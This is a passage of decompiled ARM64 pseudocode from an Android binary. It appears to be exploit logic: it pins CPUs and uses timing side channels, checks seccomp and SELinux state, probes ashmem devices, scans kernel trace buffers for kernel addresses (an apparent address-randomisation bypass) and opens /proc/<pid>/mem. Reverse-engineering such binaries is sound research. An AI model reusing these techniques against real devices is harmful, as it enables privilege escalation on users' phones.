// ==== FUN_00104bf0 @ 00104bf0 size=116 ====

void FUN_00104bf0(void)

{
  long lVar1;
  bool bVar2;
  __pid_t __pid;
  int iVar3;
  size_t __cpusetsize;
  cpu_set_t *__cpuset;
  __cpu_mask extraout_d0;
  __cpu_mask extraout_var;
  cpu_set_t local_a8;
  undefined8 local_28;
  
  lVar1 = tpidr_el0;
  __cpuset = &local_a8;
  local_28 = *(undefined8 *)(lVar1 + 0x28);
  local_a8.__bits[0xf] = 0;
  __pid = FUN_00107498(1,0,0,0x80);
  local_a8.__bits[1] = extraout_d0;
  local_a8.__bits[2] = extraout_var;
  iVar3 = sched_setaffinity(__pid,__cpusetsize,__cpuset);
  bVar2 = iVar3 == -1;
  if (bVar2) {
    FUN_001048f8();
                    /* WARNING: Subroutine does not return */
    FUN_00104934();
  }
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28));
  if (bVar2) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00104c64 @ 00104c64 size=556 ====

void FUN_00104c64(long param_1)

{
  ulong uVar1;
  bool bVar2;
  int iVar3;
  ulong uVar4;
  ulong uVar5;
  long lVar6;
  void *pvVar7;
  long *__arg;
  undefined8 uVar8;
  undefined4 uVar9;
  long lVar10;
  long lVar11;
  long lVar12;
  size_t __nmemb;
  long lVar13;
  ulong uVar14;
  ulong uVar15;
  
  lVar10 = *(long *)(param_1 + 0x18);
  uVar14 = lVar10 - 1;
  uVar4 = FUN_00104e90(param_1,*(undefined8 *)(param_1 + 0x58));
  uVar5 = FUN_00104e90(param_1,*(long *)(param_1 + 0x58) + 0x1008);
  lVar13 = 0;
  if (uVar5 <= uVar4) {
    lVar13 = 0x1008;
  }
  lVar6 = FUN_00104e90(param_1,*(long *)(param_1 + 0x58) + lVar13);
  __nmemb = *(size_t *)(param_1 + 0x40);
  pvVar7 = calloc(__nmemb,8);
  *(size_t *)(param_1 + 0x1090) = __nmemb;
  lVar13 = __nmemb + 1;
  *(void **)(param_1 + 0x1088) = pvVar7;
  *(undefined8 *)(param_1 + 0x1098) = 0x80;
  lVar12 = 0;
  while (lVar13 = lVar13 + -1, lVar13 != 0) {
    __arg = calloc(1,0x10);
    lVar11 = *(long *)(param_1 + 0x1088);
    *__arg = param_1;
    __arg[1] = 0x80;
    iVar3 = pthread_create((pthread_t *)(lVar11 + lVar12),(pthread_attr_t *)0x0,FUN_001072e4,__arg);
    lVar12 = lVar12 + 8;
    if (iVar3 == -1) goto LAB_00104e64;
  }
  lVar13 = 2;
  do {
    sched_yield();
    lVar13 = lVar13 + -1;
  } while (lVar13 != 0);
  **(long **)(param_1 + 0x1060) = param_1 + 0xe0;
  uVar4 = 0;
  if ((2 < *(ulong *)(param_1 + 0x38)) && (lVar10 != 1)) {
    uVar4 = 0;
    uVar15 = 3;
    uVar5 = 0x10;
    lVar13 = 0x2000;
    do {
      uVar1 = lVar13 + (uVar5 & 0xff8);
      if (uVar1 >> 0x24 != 0) break;
      lVar10 = *(long *)(param_1 + 0x58) + uVar1;
      uVar8 = FUN_00104e90(param_1,lVar10);
      lVar12 = *(long *)(param_1 + 0x1068);
      *(undefined8 *)(lVar12 + uVar5) = uVar8;
      if ((ulong)(lVar6 * 10) < *(ulong *)(lVar12 + uVar5)) {
        uVar4 = uVar4 + 1;
        *(long *)(*(long *)(param_1 + 0x1060) + uVar4 * 8) = lVar10;
      }
      uVar5 = uVar5 + 8;
      lVar13 = lVar13 + 0x1000;
      bVar2 = uVar15 < *(ulong *)(param_1 + 0x38);
      uVar15 = uVar15 + 1;
    } while (bVar2 && uVar4 < uVar14);
  }
  if (uVar14 == uVar4) {
    uVar9 = 2;
  }
  else {
    uVar9 = 3;
  }
  *(undefined4 *)(param_1 + 0x10a8) = uVar9;
  if (*(long *)(param_1 + 0x1088) == 0) {
    return;
  }
  iVar3 = FUN_001072a4(param_1 + *(long *)(param_1 + 0x1098) + 0x60,0x81,0x7fffffff);
  if (iVar3 != -1) {
    uVar4 = 0;
    do {
      if (*(ulong *)(param_1 + 0x1090) <= uVar4) {
        free(*(void **)(param_1 + 0x1088));
        *(undefined8 *)(param_1 + 0x1088) = 0;
        *(undefined8 *)(param_1 + 0x1090) = 0;
        return;
      }
      iVar3 = pthread_join(*(pthread_t *)((long)*(void **)(param_1 + 0x1088) + uVar4 * 8),
                           (void **)0x0);
      uVar4 = uVar4 + 1;
    } while (iVar3 != -1);
  }
LAB_00104e64:
  FUN_001048f8();
                    /* WARNING: Subroutine does not return */
  FUN_00104934();
}



// ==== FUN_00104e90 @ 00104e90 size=232 ====

void FUN_00104e90(void)

{
  long lVar1;
  long lVar2;
  int iVar3;
  size_t __nmemb;
  ulong uVar4;
  long *plVar5;
  ulong uVar6;
  long unaff_x19;
  long unaff_x21;
  ulong uVar7;
  long unaff_x29;
  undefined1 auVar8 [16];
  long local_458 [129];
  
  FUN_001074b8();
  auVar8 = FUN_00107554();
  if (*(long *)(auVar8._0_8_ + 0x48) == 0) {
    __nmemb = 0;
  }
  else {
    uVar7 = 0;
    do {
      sched_yield();
      InstructionSynchronizationBarrier();
      lVar1 = cntvct_el0;
      InstructionSynchronizationBarrier();
      iVar3 = FUN_001072a4(auVar8._8_8_,0x81,0);
      if (iVar3 == -1) {
        FUN_001048f8();
                    /* WARNING: Subroutine does not return */
        FUN_00104934();
      }
      InstructionSynchronizationBarrier();
      lVar2 = cntvct_el0;
      InstructionSynchronizationBarrier();
      __nmemb = *(ulong *)(unaff_x19 + 0x48);
      local_458[uVar7] = lVar2 - lVar1;
      uVar7 = uVar7 + 1;
    } while (uVar7 < __nmemb);
  }
  qsort(local_458,__nmemb,8,(__compar_fn_t)&LAB_001072d4);
  uVar7 = *(ulong *)(unaff_x19 + 0x50);
  if (uVar7 == 0) {
    uVar4 = 0;
  }
  else {
    uVar4 = 0;
    plVar5 = local_458;
    uVar6 = uVar7;
    do {
      uVar6 = uVar6 - 1;
      uVar4 = *plVar5 + uVar4;
      plVar5 = plVar5 + 1;
    } while (uVar6 != 0);
  }
  if (*(long *)(unaff_x21 + 0x28) != *(long *)(unaff_x29 + -8)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  uVar6 = 0;
  if (uVar7 != 0) {
    uVar6 = uVar4 / uVar7;
  }
  FUN_00107568(uVar6);
  return;
}



// ==== FUN_00104f78 @ 00104f78 size=332 ====

void FUN_00104f78(undefined8 param_1)

{
  ulong uVar1;
  ulong uVar2;
  undefined1 uVar3;
  bool bVar4;
  __pid_t __pid;
  int iVar5;
  long *__arg;
  size_t __cpusetsize;
  cpu_set_t *__cpuset;
  undefined4 uVar6;
  long lVar7;
  ulong uVar8;
  long unaff_x19;
  long unaff_x21;
  long lVar9;
  ulong uVar10;
  undefined1 local_e0 [16];
  undefined1 auStack_d0 [16];
  
  __cpuset = (cpu_set_t *)local_e0;
  local_e0 = FUN_00107554(0xffffffffffffffff,param_1,0x80);
  auStack_d0 = local_e0;
  __pid = FUN_00107498(0);
  iVar5 = sched_setaffinity(__pid,__cpusetsize,__cpuset);
  if (iVar5 != -1) {
    lVar9 = 0;
    uVar10 = 0;
    do {
      if (*(ulong *)(unaff_x19 + 0x20) <= uVar10) {
        if (*(ulong *)(unaff_x19 + 0x20) != 0) {
          uVar3 = 1;
          do {
            iVar5 = pthread_join(**(pthread_t **)(unaff_x19 + 0x1080),(void **)0x0);
            FUN_001074fc(*(undefined8 *)(unaff_x19 + 0x20),iVar5);
          } while (!(bool)uVar3);
        }
        bVar4 = *(long *)(unaff_x19 + 0x1078) == -1;
        uVar6 = 4;
        if (bVar4) {
          uVar6 = 5;
        }
        *(undefined4 *)(unaff_x19 + 0x10a8) = uVar6;
        FUN_00107370(*(undefined8 *)(unaff_x21 + 0x28));
        if (bVar4) {
          return;
        }
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      __arg = calloc(1,0x20);
      lVar7 = *(long *)(unaff_x19 + 0x10a0);
      *__arg = unaff_x19;
      __arg[1] = uVar10;
      uVar8 = lVar7 * uVar10;
      uVar1 = lVar7 + uVar8;
      uVar2 = uVar1 - 0x8000000000;
      __arg[2] = uVar8 - 0x8000000000;
      __arg[3] = uVar2;
      if ((uVar8 & 0x3fffffff) != 0) {
        __arg[2] = uVar8 - 0x8000000000 & 0xffffffffc0000000;
      }
      if ((uVar1 & 0x3fffffff) != 0) {
        __arg[3] = (uVar2 & 0xffffffffc0000000) + 0x40000000;
      }
      iVar5 = pthread_create((pthread_t *)(*(long *)(unaff_x19 + 0x1080) + lVar9),
                             (pthread_attr_t *)0x0,(__start_routine *)&LAB_001050c4,__arg);
      lVar9 = lVar9 + 8;
      uVar10 = uVar10 + 1;
    } while (iVar5 != -1);
  }
  FUN_001048f8();
                    /* WARNING: Subroutine does not return */
  FUN_00104934();
}



// ==== FUN_001052a0 @ 001052a0 size=132 ====

undefined8 FUN_001052a0(void *param_1)

{
  undefined8 uVar1;
  
  munmap(*(void **)((long)param_1 + 0x1068),*(long *)((long)param_1 + 0x38) << 3);
  *(undefined8 *)((long)param_1 + 0x1068) = 0;
  munmap(*(void **)((long)param_1 + 0x1080),*(long *)((long)param_1 + 0x20) << 3);
  *(undefined8 *)((long)param_1 + 0x1080) = 0;
  munmap(*(void **)((long)param_1 + 0x1060),*(long *)((long)param_1 + 0x18) * 8 + 8);
  *(undefined8 *)((long)param_1 + 0x1060) = 0;
  munmap(*(void **)((long)param_1 + 0x58),0x1000000000);
  *(undefined8 *)((long)param_1 + 0x58) = 0;
  uVar1 = *(undefined8 *)((long)param_1 + 0x1078);
  munmap(param_1,0x10b0);
  return uVar1;
}



// ==== FUN_00105324 @ 00105324 size=36 ====

void FUN_00105324(void)

{
  sysconf(0x61);
  DAT_0010d998 = FUN_001073b4();
  return;
}



// ==== FUN_00105348 @ 00105348 size=12 ====

void FUN_00105348(void)

{
  FUN_00104f78(DAT_0010d998);
  return;
}



// ==== FUN_00105354 @ 00105354 size=40 ====

void FUN_00105354(void)

{
  FUN_001052a0(DAT_0010d998);
  DAT_0010d998 = 0;
  return;
}



// ==== FUN_0010537c @ 0010537c size=212 ====

void FUN_0010537c(undefined8 param_1,char *param_2,long param_3)

{
  undefined4 uVar1;
  undefined8 uVar2;
  long lVar3;
  undefined4 *puVar4;
  size_t sVar5;
  
  if (param_3 != 0) {
    FUN_00105450(param_2,0xffffffffffffffff,param_3,"unreadable");
    uVar2 = __open_2(param_1,0x80000);
    if (-1 < (int)uVar2) {
      lVar3 = __read_chk(uVar2,param_2,param_3 + -1,0xffffffffffffffff);
      puVar4 = (undefined4 *)__errno();
      uVar1 = *puVar4;
      close((int)uVar2);
      if (lVar3 < 1) {
        *puVar4 = uVar1;
        FUN_00105450(param_2,0xffffffffffffffff,param_3,"unreadable");
        return;
      }
      param_2[lVar3] = '\0';
      sVar5 = strcspn(param_2,"\r\n");
      param_2[sVar5] = '\0';
    }
  }
  return;
}



// ==== FUN_00105450 @ 00105450 size=160 ====

void FUN_00105450(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                 undefined8 param_5,undefined8 param_6,undefined8 param_7,undefined8 param_8,
                 undefined8 param_9)

{
  long lVar1;
  undefined1 in_ZR;
  undefined8 local_90;
  undefined8 uStack_88;
  undefined8 local_80;
  undefined8 uStack_78;
  undefined1 *local_70;
  undefined1 **ppuStack_68;
  undefined8 *puStack_60;
  undefined8 uStack_58;
  
  puStack_60 = &local_90;
  lVar1 = tpidr_el0;
  ppuStack_68 = &local_70;
  uStack_58 = 0xffffff80ffffffe0;
  local_90 = param_6;
  uStack_88 = param_7;
  local_80 = param_8;
  uStack_78 = param_9;
  local_70 = (undefined1 *)register0x00000008;
  __vsnprintf_chk(param_2,param_4,0,param_3,param_5,&local_70,param_8,param_9,param_1);
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28));
  if ((bool)in_ZR) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_001054f0 @ 001054f0 size=408 ====

void FUN_001054f0(void)

{
  long lVar1;
  undefined1 in_ZR;
  int __fd;
  char *pcVar2;
  size_t sVar3;
  long unaff_x20;
  char *__needle;
  long lVar4;
  long unaff_x29;
  undefined1 local_288;
  undefined8 local_287;
  undefined8 uStack_27f;
  undefined8 local_277;
  undefined8 uStack_26f;
  undefined8 local_267;
  undefined8 uStack_25f;
  undefined8 local_257;
  undefined8 uStack_24f;
  undefined8 uStack_247;
  undefined7 uStack_23f;
  undefined1 local_238;
  undefined7 uStack_237;
  undefined8 uStack_230;
  undefined1 auStack_228 [160];
  char acStack_188 [296];
  
  FUN_00107410();
  lVar1 = tpidr_el0;
  *(undefined8 *)(unaff_x29 + -8) = *(undefined8 *)(lVar1 + 0x28);
  memcpy(auStack_228,"NoNewPrivs=? Seccomp=? Seccomp_filters=?",0xa0);
  FUN_0010537c("/proc/self/attr/current",&stack0x00000e98,0x100);
  FUN_0010537c("/sys/fs/selinux/enforce",&stack0x00000e78,0x20);
  __fd = __open_2("/proc/self/status",0x80000);
  if (-1 < __fd) {
    read(__fd,acStack_188,0xfff);
    FUN_00107534();
    in_ZR = unaff_x20 == 1;
    if (0 < unaff_x20) {
      lVar4 = 0;
      acStack_188[unaff_x20] = '\0';
      local_277 = 0;
      local_257 = 0;
      uStack_230 = 0;
      uStack_237 = 0;
      uStack_23f = 0;
      local_238 = 0;
      uStack_247 = 0;
      uStack_25f = 0;
      local_267 = 0;
      local_288 = 0x3f;
      uStack_26f = 0x3f00000000000000;
      uStack_24f = 0x3f00000000000000;
      uStack_27f = 0;
      local_287 = 0;
      do {
        __needle = (&PTR_s_NoNewPrivs__0010c0e8)[lVar4];
        pcVar2 = strstr(acStack_188,__needle);
        if (pcVar2 != (char *)0x0) {
          sVar3 = strlen(__needle);
          for (pcVar2 = pcVar2 + sVar3; *pcVar2 == ' ' || *pcVar2 == '\t'; pcVar2 = pcVar2 + 1) {
          }
          sVar3 = strcspn(pcVar2,"\r\n");
          if (0x1e < sVar3) {
            sVar3 = 0x1f;
          }
          memcpy(&local_288 + lVar4 * 0x20,pcVar2,sVar3);
          (&local_288 + lVar4 * 0x20)[sVar3] = 0;
        }
        lVar4 = lVar4 + 1;
        in_ZR = lVar4 == 3;
      } while (!(bool)in_ZR);
      FUN_00105450(auStack_228,0xa0,0xa0,"NoNewPrivs=%s Seccomp=%s Seccomp_filters=%s",&local_288,
                   (long)&uStack_26f + 7,(long)&uStack_24f + 7);
    }
  }
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28));
  if ((bool)in_ZR) {
    FUN_001074d0();
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00105688 @ 00105688 size=32 ====

void FUN_00105688(undefined8 param_1,ulong param_2,ulong param_3,undefined8 param_4,
                 undefined8 param_5,ulong param_6)

{
  syscall(0x62,param_1,param_2 & 0xffffffff,param_3 & 0xffffffff,param_4,param_5,
          param_6 & 0xffffffff);
  return;
}



// ==== FUN_001056a8 @ 001056a8 size=112 ====

void FUN_001056a8(ulong param_1,uint param_2)

{
  long lVar1;
  undefined1 in_ZR;
  undefined8 local_58;
  undefined8 local_50;
  ulong uStack_48;
  undefined8 uStack_40;
  undefined8 uStack_38;
  undefined8 local_30;
  undefined8 local_28;
  
  lVar1 = tpidr_el0;
  local_28 = *(undefined8 *)(lVar1 + 0x28);
  local_50 = 0;
  uStack_38 = 0;
  uStack_40 = 0;
  uStack_48 = (ulong)param_2;
  local_30 = 0;
  local_58 = DAT_001022c0;
  syscall(0x112,param_1 & 0xffffffff,&local_58,0);
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28));
  if ((bool)in_ZR) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00105718 @ 00105718 size=92 ====

bool FUN_00105718(undefined8 param_1)

{
  int __fd;
  
  __fd = __open_2(param_1,0x80002);
  if (-1 < __fd) {
    close(__fd);
    FUN_00105450(s__dev_ashmem_0010d600,0x100,0x100,&DAT_00101e8f,param_1);
  }
  return -1 < __fd;
}



// ==== FUN_00105774 @ 00105774 size=108 ====

void FUN_00105774(char *param_1,long param_2)

{
  long lVar1;
  undefined1 in_ZR;
  int iVar2;
  uint local_98;
  long local_88;
  long local_28;
  
  lVar1 = tpidr_el0;
  local_28 = *(long *)(lVar1 + 0x28);
  iVar2 = stat(param_1,(stat *)&stack0xffffffffffffff58);
  if (iVar2 == 0) {
    in_ZR = (local_98 & 0xf000) == 0x2000 && local_88 == param_2;
  }
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28),
               iVar2 == 0 && ((local_98 & 0xf000) == 0x2000 && local_88 == param_2));
  if (!(bool)in_ZR) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}



// ==== FUN_001057e0 @ 001057e0 size=392 ====

void FUN_001057e0(void)

{
  long lVar1;
  undefined1 in_ZR;
  int iVar2;
  uint uVar3;
  size_t sVar4;
  DIR *pDVar5;
  DIR *__dirp;
  dirent *pdVar6;
  long unaff_x20;
  long unaff_x29;
  stat asStack_258 [3];
  
  FUN_001074b8();
  lVar1 = tpidr_el0;
  *(undefined8 *)(unaff_x29 + -8) = *(undefined8 *)(lVar1 + 0x28);
  iVar2 = __open_2("/proc/sys/kernel/random/boot_id",0x80000);
  if (-1 < iVar2) {
    read(iVar2,(void *)(unaff_x29 + -0x88),0x7f);
    FUN_00107534();
    in_ZR = unaff_x20 == 1;
    if (0 < unaff_x20) {
      *(undefined1 *)(unaff_x29 + -0x88 + unaff_x20) = 0;
      sVar4 = strcspn((char *)(unaff_x29 + -0x88),"\r\n");
      *(undefined1 *)(unaff_x29 + -0x88 + sVar4) = 0;
      FUN_00105450(asStack_258[0].__unused + 1,0x100,0x100,"/dev/ashmem%s",unaff_x29 + -0x88);
      pDVar5 = (DIR *)FUN_00105718(asStack_258[0].__unused + 1);
      if ((int)pDVar5 != 0) goto LAB_00105948;
    }
  }
  iVar2 = stat("/dev/ashmem",asStack_258);
  __dirp = opendir("/dev");
  pDVar5 = __dirp;
  if (((iVar2 == 0) && (__dirp != (DIR *)0x0)) &&
     (in_ZR = ((uint)asStack_258[0].st_nlink & 0xf000) == 0x2000, (bool)in_ZR)) {
    pdVar6 = readdir(__dirp);
    if (pdVar6 != (dirent *)0x0) {
      do {
        iVar2 = strncmp(pdVar6->d_name,"ashmem",6);
        if ((iVar2 == 0) && (iVar2 = strcmp(pdVar6->d_name,"ashmem"), iVar2 != 0)) {
          FUN_00105450(asStack_258[0].__unused + 1,0x100,0x100,"/dev/%s",pdVar6->d_name);
          iVar2 = FUN_00105774(asStack_258[0].__unused + 1,asStack_258[0]._32_8_);
          if ((iVar2 != 0) && (iVar2 = FUN_00105718(asStack_258[0].__unused + 1), iVar2 != 0))
          goto LAB_00105940;
        }
        pdVar6 = readdir(__dirp);
      } while (pdVar6 != (dirent *)0x0);
      pDVar5 = (DIR *)0x0;
      goto LAB_0010593c;
    }
  }
  else {
LAB_0010593c:
    if (__dirp == (DIR *)0x0) goto LAB_00105948;
  }
LAB_00105940:
  uVar3 = closedir(__dirp);
  pDVar5 = (DIR *)(ulong)uVar3;
LAB_00105948:
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28),pDVar5);
  if (!(bool)in_ZR) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  FUN_00107568();
  return;
}



// ==== FUN_00105968 @ 00105968 size=20 ====

void FUN_00105968(void)

{
  __open_2(s__dev_ashmem_0010d600,0x80002);
  return;
}



// ==== FUN_0010597c @ 0010597c size=980 ====

void FUN_0010597c(void)

{
  ulong uVar1;
  long lVar2;
  bool bVar3;
  int iVar4;
  __pid_t _Var5;
  int __fd;
  uint uVar6;
  ulong *puVar7;
  undefined8 uVar8;
  void *__ptr;
  long lVar9;
  char *__nptr;
  int *piVar10;
  ulong uVar11;
  ulong uVar12;
  ulong uVar13;
  ulong uVar14;
  long lVar15;
  int iVar16;
  bool bVar17;
  long unaff_x29;
  ulong local_f8;
  char *local_f0;
  ulong local_e8;
  ulong local_e0 [16];
  
  puVar7 = (ulong *)FUN_00107410();
  lVar2 = tpidr_el0;
  *(undefined8 *)(unaff_x29 + -0x10) = *(undefined8 *)(lVar2 + 0x28);
  uVar8 = 0;
  if ((puVar7 == (ulong *)0x0) ||
     (uVar8 = FUN_00107464("/sys/kernel/tracing/tracing_on"), (int)uVar8 == 0)) goto LAB_00105d04;
  iVar4 = __open_2("/sys/kernel/tracing/trace",0x80201);
  if (-1 < iVar4) {
    close(iVar4);
  }
  uVar8 = FUN_001074f0("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable");
  if (((int)uVar8 == 0) || (uVar8 = FUN_001074f0("/sys/kernel/tracing/tracing_on"), (int)uVar8 == 0)
     ) goto LAB_00105d04;
  _Var5 = getpid();
  FUN_00105450(&local_f0,0x60,0x60,"/data/local/tmp/.s23-trace-io-%d",_Var5);
  iVar4 = open((char *)&local_f0,0x80242,0x180);
  if (-1 < iVar4) {
    __ptr = calloc(1,0x40000);
    if (__ptr != (void *)0x0) {
      iVar16 = 0;
      while (iVar16 != 0x10) {
        lVar15 = 0;
        while (lVar15 < 0x40000) {
          lVar9 = __write_chk(iVar4,(long)__ptr + lVar15,0x40000 - lVar15,0xffffffffffffffff);
          lVar15 = lVar9 + lVar15;
          if (lVar9 < 1) goto LAB_00105a88;
        }
        iVar16 = iVar16 + 1;
        if (lVar15 != 0x40000) break;
      }
LAB_00105a88:
      free(__ptr);
    }
    fsync(iVar4);
    close(iVar4);
    unlink((char *)&local_f0);
  }
  __nptr = getenv("TRACEFS_SAMPLE_SECONDS");
  if ((__nptr == (char *)0x0) || (*__nptr == '\0')) {
LAB_00105aec:
    uVar6 = 1;
  }
  else {
    local_f0 = (char *)0x0;
    piVar10 = (int *)__errno();
    *piVar10 = 0;
    uVar11 = strtol(__nptr,&local_f0,0);
    if ((*piVar10 != 0) || (local_f0 == __nptr)) goto LAB_00105aec;
    uVar6 = (uint)uVar11;
    if (((0x1e < (long)uVar11 || uVar11 == 0) || 0x7fffffffffffffff < uVar11) || *local_f0 != '\0')
    {
      uVar6 = 1;
    }
  }
  sleep(uVar6);
  FUN_00107464("/sys/kernel/tracing/tracing_on");
  iVar4 = FUN_00107484();
  if (iVar4 < 1) {
    bVar17 = true;
    local_f8 = 0;
  }
  else {
    iVar16 = 0;
    local_f8 = 0;
    do {
      FUN_00105450(unaff_x29 + -0x90,0x80,0x80,"/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw",
                   iVar16);
      __fd = __open_2(unaff_x29 + -0x90,0x80800);
      if (__fd < 0) {
        bVar3 = false;
      }
      else {
        uVar11 = read(__fd,&local_f0,0x1000);
        while (0 < (long)uVar11) {
          if (0x13 < uVar11) {
            if (0x27 < uVar11) {
              lVar15 = 0;
              do {
                if ((*(short *)((long)local_e0 + lVar15) == 0x6c) &&
                   (uVar12 = *(ulong *)((long)local_e0 + lVar15 + 0x10), uVar1 = uVar12 - 0x10db44,
                   (0xfffeffffffffffff < uVar12 && 0xffffffc007ffffff < uVar1) &&
                   (uVar1 & 0xfff) == 0)) {
                  bVar3 = true;
                  local_f8 = uVar1;
                  goto LAB_00105ca8;
                }
                uVar1 = lVar15 + 0x2c;
                lVar15 = lVar15 + 4;
              } while (uVar1 <= uVar11);
            }
            uVar1 = (local_e8 & 0xfff) + 0x10;
            if (uVar11 <= uVar1) {
              uVar1 = uVar11;
            }
            if (0x13 < uVar1) {
              uVar11 = 0x14;
              uVar12 = 0x10;
              do {
                uVar14 = (ulong)*(uint *)((long)&local_f0 + uVar12) & 0x1f;
                uVar6 = (uint)uVar14;
                uVar13 = uVar11;
                if (uVar6 != 0) {
                  if (uVar6 == 0x1f) {
                    uVar13 = uVar12 + 0xc;
                  }
                  else if (uVar6 == 0x1e) {
                    uVar13 = uVar12 + 8;
                  }
                  else {
                    uVar13 = uVar11 + uVar14 * 4;
                    if (0x1c < uVar6 || uVar1 < uVar13) break;
                    if ((((5 < uVar6) && (*(short *)((long)&local_f0 + uVar11) == 0x6c)) &&
                        (uVar12 = *(ulong *)((long)local_e0 + uVar11) - 0x10db44,
                        0xfffeffffffffffff < *(ulong *)((long)local_e0 + uVar11) &&
                        0xffffffc007ffffff < uVar12)) && ((uVar12 & 0xfff) == 0)) {
                      bVar3 = true;
                      local_f8 = uVar12;
                      goto LAB_00105ca8;
                    }
                  }
                }
                uVar11 = uVar13 + 4;
                uVar12 = uVar13;
              } while (uVar11 <= uVar1);
            }
          }
          uVar11 = read(__fd,&local_f0,0x1000);
        }
        bVar3 = false;
LAB_00105ca8:
        close(__fd);
      }
      bVar17 = !bVar3;
    } while ((!bVar3) && (iVar16 = iVar16 + 1, iVar16 < iVar4));
  }
  FUN_00107464("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable");
  if (bVar17) {
    uVar8 = 0;
  }
  else {
    uVar8 = 1;
    *puVar7 = local_f8;
  }
LAB_00105d04:
  if (*(long *)(lVar2 + 0x28) != *(long *)(unaff_x29 + -0x10)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(uVar8);
  }
  FUN_001074d0();
  return;
}



// ==== FUN_00105d50 @ 00105d50 size=112 ====

void FUN_00105d50(undefined8 param_1,char *param_2)

{
  bool bVar1;
  int __fd;
  size_t sVar2;
  size_t sVar3;
  
  __fd = __open_2(param_1,0x80001);
  if (__fd < 0) {
    bVar1 = false;
  }
  else {
    sVar2 = strlen(param_2);
    sVar3 = __write_chk(__fd,param_2,sVar2,0xffffffffffffffff);
    close(__fd);
    bVar1 = sVar3 == sVar2;
  }
  FUN_00107508(bVar1);
  return;
}



// ==== FUN_00105dc0 @ 00105dc0 size=88 ====

undefined4 FUN_00105dc0(ulong param_1)

{
  undefined4 uVar1;
  
  uVar1 = 0;
  if ((0xffffffc007ffffff < param_1) && ((param_1 & 0xfff) == 0)) {
    uVar1 = 1;
    DAT_0010da48 = 1;
    DAT_0010da68 = param_1;
    FUN_0010a3fc(DAT_0010d9a8);
  }
  return uVar1;
}



// ==== FUN_00105e18 @ 00105e18 size=8 ====

void FUN_00105e18(long param_1,long param_2,undefined8 param_3)

{
  *(undefined8 *)(param_1 + param_2) = param_3;
  return;
}



// ==== FUN_00105e20 @ 00105e20 size=8 ====

void FUN_00105e20(long param_1,long param_2,undefined4 param_3)

{
  *(undefined4 *)(param_1 + param_2) = param_3;
  return;
}



// ==== FUN_00105e28 @ 00105e28 size=92 ====

void FUN_00105e28(void)

{
  byte bVar1;
  undefined1 in_ZR;
  byte *pbVar2;
  long unaff_x20;
  byte *unaff_x21;
  long unaff_x22;
  byte abStack_148 [264];
  
  FUN_00107334();
  if (unaff_x20 != 0) {
    pbVar2 = abStack_148;
    do {
      bVar1 = *unaff_x21;
      if (bVar1 < 2) {
        bVar1 = 1;
      }
      unaff_x20 = unaff_x20 + -1;
      in_ZR = unaff_x20 == 0;
      *pbVar2 = bVar1;
      pbVar2 = pbVar2 + 1;
      unaff_x21 = unaff_x21 + 1;
    } while (!(bool)in_ZR);
  }
  FUN_00107430();
  FUN_00107370(*(undefined8 *)(unaff_x22 + 0x28));
  if ((bool)in_ZR) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00105e84 @ 00105e84 size=108 ====

void FUN_00105e84(undefined4 param_1,long param_2,long param_3)

{
  int iVar1;
  undefined8 uVar2;
  
  iVar1 = FUN_00105e28();
  if (iVar1 == 0) {
    if (param_3 != 0) {
      param_3 = param_3 + -1;
      do {
        if ((*(char *)(param_2 + param_3) == '\0') &&
           (iVar1 = FUN_00105e28(param_1,param_2,param_3), iVar1 != 0)) goto LAB_00105ea8;
        param_3 = param_3 + -1;
      } while (param_3 != -1);
    }
    uVar2 = 0;
  }
  else {
LAB_00105ea8:
    uVar2 = 0xffffffff;
  }
  FUN_00107508(uVar2);
  return;
}



// ==== FUN_00105ef0 @ 00105ef0 size=80 ====

void FUN_00105ef0(void)

{
  int iVar1;
  __pid_t _Var2;
  long lVar3;
  
  lVar3 = FUN_00107394();
  if (lVar3 != -1) {
    if ((int)lVar3 != 0) {
      return;
    }
    iVar1 = FUN_00107548();
    if (iVar1 != -1) {
      _Var2 = getppid();
      if (_Var2 != 1) {
        FUN_00104bf0();
        do {
          pause();
        } while( true );
      }
                    /* WARNING: Subroutine does not return */
      _exit(0);
    }
  }
  FUN_001048f8();
                    /* WARNING: Subroutine does not return */
  FUN_00104934();
}



// ==== FUN_00105f40 @ 00105f40 size=84 ====

void FUN_00105f40(void)

{
  int iVar1;
  __pid_t _Var2;
  long lVar3;
  
  lVar3 = FUN_00107394();
  if (lVar3 != -1) {
    if ((int)lVar3 != 0) {
      return;
    }
    iVar1 = FUN_00107548();
    if (iVar1 != -1) {
      _Var2 = getppid();
      if (_Var2 == 1) {
                    /* WARNING: Subroutine does not return */
        _exit(1);
      }
      FUN_00104c64(DAT_0010d998);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  }
  FUN_001048f8();
                    /* WARNING: Subroutine does not return */
  FUN_00104934();
}



// ==== FUN_00105f94 @ 00105f94 size=116 ====

void FUN_00105f94(undefined4 param_1)

{
  long lVar1;
  bool bVar2;
  int iVar3;
  undefined1 auStack_68 [64];
  undefined8 local_28;
  
  lVar1 = tpidr_el0;
  local_28 = *(undefined8 *)(lVar1 + 0x28);
  FUN_00105450(auStack_68,0x40,0x40,"/proc/%d/mem",param_1);
  iVar3 = __open_2(auStack_68,0);
  bVar2 = iVar3 == -1;
  if (bVar2) {
    FUN_001048f8();
                    /* WARNING: Subroutine does not return */
    FUN_00104934();
